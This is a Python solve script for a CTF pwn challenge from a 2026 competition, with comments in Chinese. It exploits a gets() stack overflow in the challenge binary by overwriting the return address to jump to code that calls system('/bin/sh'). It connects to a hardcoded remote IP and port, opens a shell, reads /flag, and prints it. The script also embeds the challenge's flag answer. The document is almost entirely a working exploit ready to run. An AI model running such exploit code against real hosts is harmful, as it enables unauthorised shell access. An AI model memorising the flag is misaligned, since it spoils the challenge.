#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
2026 湾区杯决赛 · 赛道二 · 环节二 pwn02  ——  gets 栈溢出直达 hackme 内部

qid  : NwH7yHPUhNL3YUEx
flag : flag{403cc1ed-aba3-4b2d-af5e-b9580bfde22c}

二进制: attachments/pwn  (ELF64, 16944 B)
        Partial RELRO / No canary / NX enabled / No PIE (0x400000) / SHSTK / IBT

漏洞: int main() { ...; char buf[0x20]; gets(buf); }        <- 溢出，偏移 0x28
      int hackme() { int a = 1; if (a == b /* 未初始化 [rbp-8] */) system("/bin/sh"); }
      b 不可控 -> 不必过比较：直接跳到 hackme+0x1b（0x4011b1 = lea rdi,"/bin/sh" ; call system）

用法:
    python solve.py
    python solve.py --host 127.0.0.1 --port 9999
"""
import argparse
import re
import socket
import struct
import sys
import time

DEFAULT_HOST = '47.94.108.28'       # 比赛期间原始地址（会随平台 reset 变化）
DEFAULT_PORT = 34893

BUF = 0x20                          # char buf[0x20]
OFFSET = BUF + 8                    # + saved rbp = 0x28
HACKME = 0x401196                   # hackme() 入口（本体，要过未初始化比较）
SYSTEM_BINSH = 0x4011b1             # hackme+0x1b: lea rdi,"/bin/sh" ; call system

READFLAG = b'read a < /flag; echo $a\n'


def p64(x):
    return struct.pack('<Q', x)


def build_payload(saved_rbp=0xdeadbeef, target=SYSTEM_BINSH):
    return b'A' * BUF + p64(saved_rbp) + p64(target)


class Tube(object):
    def __init__(self, host, port, timeout=15.0):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b''

    def send(self, data):
        self.s.sendall(data)

    def _fill(self, t):
        end = time.time() + t
        while True:
            left = end - time.time()
            if left <= 0:
                return False
            self.s.settimeout(left)
            try:
                chunk = self.s.recv(4096)
            except socket.timeout:
                return False
            except OSError:
                return False
            if not chunk:
                return False
            self.buf += chunk

    def drain(self, t=2.0):
        self._fill(t)
        out, self.buf = self.buf, b''
        return out

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


def exploit(host, port, target=SYSTEM_BINSH, saved_rbp=0xdeadbeef, timeout=15.0):
    t = Tube(host, port, timeout=timeout)
    print('[*] connected %s:%d' % (host, port))
    payload = build_payload(saved_rbp, target)
    print('[*] payload = A*%d + %#x + %#x' % (BUF, saved_rbp, target))
    t.send(payload + b'\n')          # gets() 以换行结束
    time.sleep(0.6)
    t.drain(0.6)

    t.send(b'echo __SHELL_OK__\n')
    time.sleep(0.3)
    t.drain(0.6)
    t.send(READFLAG)                 # 容器极简：无 cat/ls/id，只有 dash 内建
    text = t.drain(6.0).decode('utf-8', 'replace')
    t.close()
    print('[+] shell 回显:\n%s' % text)
    m = re.search(r'flag\{[0-9a-zA-Z_\-]{6,}\}', text)
    return m.group(0) if m else None


def main():
    ap = argparse.ArgumentParser(description='湾区杯决赛 赛道二 环节二 pwn02 gets 栈溢出')
    ap.add_argument('--host', default=DEFAULT_HOST, help='容器地址（reset 后会变）')
    ap.add_argument('--port', type=int, default=DEFAULT_PORT)
    ap.add_argument('--target', default=None,
                    help='跳转目标，默认 0x4011b1(hackme+0x1b)；也可用 0x401196 + --rbp 1')
    ap.add_argument('--rbp', default=None, help='覆盖 saved rbp 的值（走 hackme 本体时需要 =1）')
    ap.add_argument('--retries', type=int, default=3)
    args = ap.parse_args()

    target = int(args.target, 0) if args.target else SYSTEM_BINSH
    saved_rbp = int(args.rbp, 0) if args.rbp else 0xdeadbeef

    for i in range(1, args.retries + 1):
        try:
            flag = exploit(args.host, args.port, target, saved_rbp)
            if flag:
                print('\n[FLAG] %s' % flag)
                return 0
            print('[!] 第 %d 次未匹配到 flag' % i)
        except Exception as e:                                    # noqa: BLE001
            print('[!] 第 %d 次失败: %s: %s' % (i, type(e).__name__, e))
        time.sleep(1.0)
    print('[-] 未取得 flag')
    return 1


if __name__ == '__main__':
    sys.exit(main())
